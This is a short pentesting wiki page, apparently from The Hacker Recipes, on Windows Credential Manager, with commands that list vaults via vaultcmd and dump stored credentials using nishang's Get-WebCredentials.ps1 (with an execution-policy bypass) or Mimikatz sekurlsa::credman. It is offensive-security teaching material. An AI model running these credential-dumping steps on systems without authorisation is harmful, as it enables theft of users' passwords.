---
authors: ShutdownRepo
category: ad
---

# 🛠️ Windows Credential Manager



## Theory

Windows Credential Manager is a built-in feature that securely stores sensitive login information for websites, applications, and networks. It houses login credentials such as usernames, passwords, and web addresses. There are four distinct categories of stored credentials:

1. **Web-based credentials**: authentication details saved in web browsers (or other applications)
2. **Windows-specific credentials**: authentication data such as NTLM or Kerberos
3. **Generic credentials**: fundamental authentication data, such as clear-text usernames and passwords
4. **Certificate-based credentials**: comprehensive information based on certificates

## Practice 

From Windows systems, `vaultcmd.exe` can be used to enumerate, check and list Microsoft Credentials. However, this tool does not allow to see clear text passwords as it is an official, native, Windows program.

```powershell
#enumerate current Windows safes available
vaultcmd /list

#Check for credentials stored in the vault
VaultCmd /listproperties:"$coffre_name"

#more information about the Vault 
VaultCmd /listcreds:"$coffre_name"
```

The vault can be dumped in with [Get-WebCredentials.ps1](https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1) (PowerShell) .

```powershell
powershell -ex bypass

Import-Module C:\Get-WebCredentials.ps1

Get-WebCredentials
```

Alternatively, [Mimkatz](https://github.com/gentilkiwi/mimikatz) (C) can be used for that purpose, with [`sekurlsa::credman`](https://tools.thehacker.recipes/mimikatz/modules/sekurlsa/credman).